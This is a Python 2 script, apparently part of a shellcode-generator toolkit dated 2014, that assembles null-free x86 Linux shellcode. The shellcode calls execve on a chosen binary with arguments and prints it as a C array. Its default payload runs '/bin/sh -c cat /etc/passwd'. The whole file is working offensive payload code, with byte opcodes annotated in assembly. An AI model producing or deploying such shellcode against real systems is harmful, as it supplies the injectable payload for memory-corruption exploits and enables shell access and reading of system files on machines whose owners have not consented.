import sys
from init_regs import *
from struct import pack
from description import *
from padding import *
from out_format import *

##########################################################
#
#   exec binfile  with paramters if given
#
#	                         random	     2014-04-21
##########################################################


##########################################################
des_format = 'shellcode: exec %s %s' 
ALIGN = 4
BIN_FILE = '/bin/sh'
PARAMETERS = ['-c','cat /etc/passwd']
##########################################################

def execve_shellcode(binpath,parameters):

	if len(binpath) % ALIGN :
		binpath = PaddingFilepath(binpath,ALIGN)
	strlen = len(binpath)
	cnt = strlen / ALIGN
	shellcode = ''

	#call execve(binpath,[binpath,arg1,arg2,...],NULL)
	shellcode += '\x31\xc0'												#xor eax,eax
	shellcode += '\x31\xd2\x52'											#xor edx,edx#push edx  --->  null bytes
	#push binpath
	binpath = binpath[::-1]													#reverse str
	for i in xrange(cnt):
			#push binpath
			shellcode += '\x68'												#push opcode
			shellcode += binpath[i*ALIGN:(i+1)*ALIGN][::-1]	#reverse
	shellcode += '\x89\xe3'												#mov ebx,esp	 #ebx store  the first argv for execve		
	#build the second argv for execve
	shellcode += '\x52'														#push edx  ---> as null bytes
	cnt = len(parameters)	
	if cnt:
		shellcode += '\x83\xec'	 + pack('B',(cnt*4) + 4)		#sub esp,cnt*4
		shellcode += '\x89\xe1'											#mov ecx, esp	  ecx= esp  #ecx store  the second argv for execve	
		for i in xrange(cnt):
				p = parameters[i][::-1]
				l = len(p)
				c = l / 2
				r = l % 2
				shellcode += '\x52'											#push edx  ---> as null bytes 
				for j in xrange(c):
					shellcode += '\x66\xb8'								#mov ax
					shellcode += p[j*2:(j+1)*2][::-1]	
					shellcode += '\x66\x50'								#push ax
				if r:
					shellcode += '\x31\xc0'								#xor eax,eax
					shellcode += '\xb4' + p[l-1]							#mov ah,p[_len-1]
					shellcode += '\x66\x50'								#push ax
					shellcode += '\x44'										#inc esp
				shellcode += "\x89\xe0"									#mov eax,esp
				shellcode += '\x89\x41' + pack('B',((i+1)*4))		#mov [ecx+(i+1)*4],eax
		shellcode += '\x89\x19'											#mov [ecx],ebx
	else:
		shellcode += '\x53'													#push ebx 
		shellcode += '\x89\xe1'											#mov ecx, esp	  ecx= esp
	shellcode += '\x31\xc0'												#xor eax,eax
	shellcode += '\xb0\x0b'												#mov al,0x0b	# execve call num
	shellcode += '\xcd\x80'												#int 0x80
	#call exit()
	#shellcode += '\x31\xc0\x31\xdb\x40\xcd\x80'
	return shellcode


if __name__ == '__main__':
	shellcode = init_regs_shellcode()
	shellcode += execve_shellcode( binpath=BIN_FILE, parameters=PARAMETERS)
	out_format(language='c',ouput=shellcode)